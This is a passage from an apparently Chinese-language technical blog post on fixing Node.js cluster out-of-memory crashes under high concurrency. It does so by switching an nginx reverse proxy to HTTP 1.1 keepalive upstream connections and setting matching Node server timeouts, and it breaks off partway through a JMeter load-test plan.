&#x3D;&#x3D;&#x3D;&#x3D; JS stack trace &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;

    0: ExitFrame [pc: 0x1381859]
Security context: 0x0a5f87230cc9 &lt;JSObject&gt;
    1: &#x2F;* anonymous *&#x2F; [0x354d92c72169] [internal&#x2F;cluster&#x2F;round_robin_handle.js:~32] [pc&#x3D;0x1be20be0065](this&#x3D;0x3cd6cfa14001 &lt;TCP map &#x3D; 0x2e9326ca19f1&gt;,-24,0x10a4561c04a9 &lt;undefined&gt;)
    2: InternalFrame [pc: 0x12ff49d]
    3: EntryFrame [pc: 0x12ff278]

&#x3D;&#x3D;&#x3D;&#x3D; Details &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;

[0]: ExitFrame [pc: 0x1381859]
[1]: &#x2F;* anonymou...

FATAL ERROR: invalid array length Allocation failed - JavaScript heap out of memory

Failed to open Node.js report file: report.20210123.192612.65994.0.001.json (errno: 24)
 1: 0x9dbd20 node::Abort() [PM2 v4.1.2: God Daemon (&#x2F;root&#x2F;.pm2)]
 2: 0x9dced6 node::OnFatalError(char const*, char const*) [PM2 v4.1.2: God Daemon (&#x2F;root&#x2F;.pm2)]
 3: 0xb3d96e v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, bool) [PM2 v4.1.2: God Daemon (&#x2F;root&#x2F;.pm2)]
 4: 0xb3dce9 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, bool) [PM2 v4.1.2: God Daemon (&#x2F;root&#x2F;.pm2)]
 5: 0xcea835  [PM2 v4.1.2: God Daemon (&#x2F;root&#x2F;.pm2)]
 6: 0xcc1340 v8::internal::Factory::NewUninitializedFixedArray(int, v8::internal::AllocationType) [PM2 v4.1.2: God Daemon (&#x2F;root&#x2F;.pm2)]
 7: 0xe2c261  [PM2 v4.1.2: God Daemon (&#x2F;root&#x2F;.pm2)]
 8: 0xe2c510  [PM2 v4.1.2: God Daemon (&#x2F;root&#x2F;.pm2)]
 9: 0xfd41db v8::internal::Runtime_GrowArrayElements(int, unsigned long*, v8::internal::Isolate*) [PM2 v4.1.2: God Daemon (&#x2F;root&#x2F;.pm2)]
10: 0x1381859  [PM2 v4.1.2: God Daemon (&#x2F;root&#x2F;.pm2)]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>internal&#x2F;cluster&#x2F;round_robin_handle.js 正是 Node 中处理主进程给工作进程分发 socket 句柄的逻辑的代码。</p>
</blockquote>
<p>解决当前问题的思路，无怪乎有三种：提高当前策略的效率，换一个更高效稳定的策略，降低客户端连接建立频率。对于第一种解决方案，在 pull request <a href="https://github.com/nodejs/node/pull/40615">#40615</a> 中得到改善，目前代码正在被合并到主线中，尚未发布 Node 版本中；对于第二种方案，可以使用 Linux 内核 3.9+ 中新出来的 SO_REUSEPORT 特性来解决，需要同时改造 libuv 和 Node 源码，参见 pull request <a href="https://github.com/libuv/libuv/pull/3198">#3198</a>，不过目前依然没有得到官方的合并通过。</p>
<p>那么我们能实操的就只有方案三了，有高并发的服务一般都是大量用户同时访问导致的，对于这种从用户端来的流量，我们按照管理都会在前面架设 nginx，来做 https 证书解析和反向代理。我们就可以在这个 nginx 上做文章。</p>
<p>比如说我们有如下 nginx 配置：</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">upstream</span> service1</span> <span class="token punctuation">&#123;</span>
    <span class="token directive"><span class="token keyword">server</span> 192.168.1.3:8000</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">server</span> 192.168.1.5:8000</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">&#123;</span>
    <span class="token directive"><span class="token keyword">listen</span>       <span class="token number">8080</span></span><span class="token punctuation">;</span>
	<span class="token directive"><span class="token keyword">location</span> =/</span> <span class="token punctuation">&#123;</span>
        <span class="token directive"><span class="token keyword">add_header</span> Content-Type text/html</span><span class="token punctuation">;</span>
		<span class="token directive"><span class="token keyword">add_header</span> Cache-Control no-cache,max-age=0</span><span class="token punctuation">;</span>
		<span class="token directive"><span class="token keyword">return</span> <span class="token number">200</span> <span class="token string">"This is home"</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token directive"><span class="token keyword">location</span> /</span> <span class="token punctuation">&#123;</span>
        <span class="token directive"><span class="token keyword">proxy_pass</span>  http://service1</span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_redirect</span> <span class="token boolean">off</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-Proto <span class="token variable">$scheme</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Real-IP <span class="token variable">$remote_addr</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> Host <span class="token variable">$http_host</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_connect_timeout</span>   <span class="token number">120</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_send_timeout</span>      <span class="token number">120</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_read_timeout</span>      <span class="token number">120</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>    
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.1.1</strong></p>
<p>上述代码看上去没有什么问题，一般网上的资料在配置反向代理的时候，也都跟上述代码差不多。但是如果使用上述配置那么 nginx 和 node 服务之间使用的就是 HTTP 1.0 版本的协议，也就是说对于每次请求来说底层都会创建一个 socket 句柄。随着并发量的增多，积压在主进程中的待发送句柄就会增多，正好暴露出来了我们之前提到的主进程默认负载策略效率低下的问题。</p>
<p>解决方案也挺简单，就是改用 HTTP 1.1</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">upstream</span> service1</span> <span class="token punctuation">&#123;</span>
    <span class="token directive"><span class="token keyword">server</span> 192.168.1.3:8000 max_conns=128</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">server</span> 192.168.1.5:8000 max_conns=128</span><span class="token punctuation">;</span>
	
    <span class="token directive"><span class="token keyword">keepalive_timeout</span> <span class="token number">1800s</span></span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">keepalive_requests</span> <span class="token number">10000000</span></span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">least_conn</span></span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">keepalive</span> <span class="token number">256</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">&#123;</span>
    <span class="token directive"><span class="token keyword">listen</span>       <span class="token number">8080</span></span><span class="token punctuation">;</span>
	<span class="token directive"><span class="token keyword">location</span> =/</span> <span class="token punctuation">&#123;</span>
        <span class="token directive"><span class="token keyword">add_header</span> Content-Type text/html</span><span class="token punctuation">;</span>
		<span class="token directive"><span class="token keyword">add_header</span> Cache-Control no-cache,max-age=0</span><span class="token punctuation">;</span>
		<span class="token directive"><span class="token keyword">return</span> <span class="token number">200</span> <span class="token string">"This is home"</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token directive"><span class="token keyword">location</span> /</span> <span class="token punctuation">&#123;</span>
        <span class="token directive"><span class="token keyword">proxy_pass</span>  http://service1</span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_redirect</span> <span class="token boolean">off</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_http_version</span>              1.1</span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span>                Connection <span class="token string">""</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-Proto <span class="token variable">$scheme</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Real-IP <span class="token variable">$remote_addr</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> Host <span class="token variable">$http_host</span></span><span class="token punctuation">;</span>
        
        <span class="token directive"><span class="token keyword">proxy_connect_timeout</span>   <span class="token number">120</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_send_timeout</span>      <span class="token number">120</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_read_timeout</span>      <span class="token number">120</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>    
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.1.2</strong></p>
<p>在 location 代码块中需要加入 <code>proxy_http_version 1.1;</code> <code>proxy_set_header Connection &quot;&quot;;</code> 这两行，同时留意到我们在 upstream 代码块中加入了 <code>max_conns</code> <code>keepalive_timeout</code> <code>keepalive_requests</code> <code>least_conn</code> <code>keepalive</code> 这几个新的指令（或者属性）。首先是 <code>keepalive</code> 这个指令，它的使用经常会让大家产生误解，以为这个是 nginx 和 upstream 服务的最大连接数，其实不然。<code>keepalive</code> 限制的是每个 nginx 工作进程和 upstream 服务列表中的服务的最大空闲连接数，超过这个连接数的连接，会被 nginx 工作进程回收掉。而 <code>server</code> 指令中的 <code>max_conns</code> 属性才是当前 <code>server</code> 指令所指向的服务器和各个 nginx 工作进程之间的最大连接数。考虑这么一种情况，如果当前请求的并发量相当之大，QPS 为 1000&#x2F;s，那么在短时间内发送到 nginx 的句柄就有 1000 个之多。简单考虑，我们的 nginx 只启动了一个工作进程，如果不设置 <code>max_conns</code> 的话，那么 upstream 中的两个 server 每个都要承载 500 的并发，假设当前没有空闲句柄的话，每个 server 端都会和 nginx 建立 500 个 socket 句柄。而如果设置了 <code>max_conns</code> 时，nginx 工作进程就会自己维护一个句柄池，借用之前创建的句柄来发送新的请求。</p>
<blockquote>
<p>nginx 和 node 比较类似的地方是，他也分工作进程和主进程。</p>
</blockquote>
<p><code>keepalive_timeout</code> 和 <code>keepalive_requests</code> 这两个指令，大家在查阅资料的时候，一定要擦亮眼睛，因为两个指令可以同时存在 upstream 代码块中和 http 代码块中，大家一定要看 <a href="http://nginx.org/en/docs/http/ngx_http_upstream_module.html">upstream</a> 模块的文档。这两个指令用来规定空闲句柄的回收策略，如果一个空闲句柄超过了 <code>keepalive_timeout</code> 时间了，或者一个句柄发送过 <code>keepalive_requests</code> 次请求了，那么就会被 nginx 强制回收。</p>
<p>最后讲到的是 <code>least_conn</code> 指令，它告诉 nginx 工作进程，在进行负载均衡的时候，挑选那个何其建立句柄数最少的服务器进行发送。由于我们要控制 upstream 服务的句柄数，所以这里选择了使用 <code>least_conn</code> 这个策略，nginx 的默认策略是轮询策略。</p>
<blockquote>
<p>需要指出的是，如果你的 <code>server</code> 指令配置的是域名，并且这个域名会被随机解析出不同 IP 的话，使用免费版本的 nginx 不能很好的解决这个问题。虽然 upstream 代码块中可以设置 <code>resolve</code>  指令来动态解析域名，不过你需要付费购买收费版本才能使用这个指令。</p>
</blockquote>
<p>改完 nginx 端配置后，同样也需要修改 Node 端的代码：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">const</span> <span class="token constant">TIMEOUT_SERVER</span> <span class="token operator">=</span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> server <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
	res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'hello world\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
server<span class="token punctuation">.</span>timeout <span class="token operator">=</span> <span class="token constant">TIMEOUT_SERVER</span><span class="token punctuation">;</span>
server<span class="token punctuation">.</span>keepAliveTimeout <span class="token operator">=</span> <span class="token constant">TIMEOUT_SERVER</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>process<span class="token punctuation">.</span>pid<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> started</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.1.3</strong></p>
<p>我们只关注最后两句即可，Node 端同样需要设置空闲时间，否则服务端默认 5s 内没有从当前 socket 句柄中接收到请求，就自己强制断开当前句柄。</p>
<p>做完上述改动后，我们单条连接的生命周期被拉长，不会出现单位时间内创建过多 socket 句柄的现象。但是我们依然要考虑到，当前的 socket 句柄依然是有生命周期的，特别是在服务器端（这里指 Node 端）检测到空闲超时后，一样会断开连接，但是这时候恰巧有客户端（这里指 Nginx 端）的请求正在发送的路上，服务器端接收到这个迟来的请求后，会直接拒绝。这是一个边界的小概率问题，但是不代表不会发生。出现这种情况，如果是 GET 请求还好说，让用户端程序直接重试即；如果是 POST 请求，就要和用户端程序协商好，如何做到幂等性。</p>
<h3 id="1-2-IO-读写"><a href="#1-2-IO-读写" class="headerlink" title="1.2 IO 读写"></a>1.2 IO 读写</h3><p>提到 IO 操作，大家一般认为它不会耗费多少 CPU 时间，如果按照这个逻辑的话，一个返回 hello world 的 HTTP 请求在并发请求数逐渐增大的情况下， CPU 应该没有压力才对。</p>
<p>我们尝试对于 <strong>代码1.1.3</strong> 进行打压，然后一探究竟。</p>
<p>打压工具选择常用的 JMeter，下面给出打压用的配置文件：</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jmeterTestPlan</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.2<span class="token punctuation">"</span></span> <span class="token attr-name">properties</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5.0<span class="token punctuation">"</span></span> <span class="token attr-name">jmeter</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5.3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TestPlan</span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlanGui<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Test Plan<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.comments<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.functional_mode<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.tearDown_on_shutdown<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.serialize_threadgroups<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.user_defined_variables<span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ArgumentsPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>User Defined Variables<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>collectionProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments.arguments<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TestPlan.user_define_classpath<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TestPlan</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ThreadGroup</span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroupGui<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Thread Group<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.on_sample_error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>continue<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.main_controller<span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopController<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopControlPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopController<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Loop Controller<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopController.continue_forever<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>LoopController.loops<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>-1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intProp</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>elementProp</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.num_threads<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>16<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.ramp_time<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.scheduler<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.duration<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stringProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.delay<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stringProp</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>boolProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ThreadGroup.same_user_on_next_iteration<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>boolProp</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ThreadGroup</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hashTree</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTTPSamplerProxy</span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HttpTestSampleGui<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPSamplerProxy<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTP Request<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>elementProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPsampler.Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">elementType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">guiclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTPArgumentsPanel<span class="token punctuation">"</span></span> <span class="token attr-name">testclass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments<span class="token punctuation">"</span></span> <span class="token attr-name">testname</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>User Defined Variables<span class="token punctuation">"</span></span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>collectionProp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Arguments.arguments<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
